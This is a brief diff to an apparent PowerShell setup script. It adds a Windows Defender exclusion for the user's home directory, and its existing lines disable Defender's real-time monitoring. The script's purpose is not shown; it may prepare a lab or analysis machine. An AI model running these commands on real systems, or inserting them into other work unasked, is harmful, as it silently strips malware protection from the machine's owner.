@@ -1,3 +1,6 @@
+set-MpPreference -ExclusionPath ~
+Write-Output "[+] Excluded Path from Windows Defender"
+
 Set-MpPreference -DisableRealTimeMonitoring $true
 Write-Output "[+] Disabled Windows Defender"
 
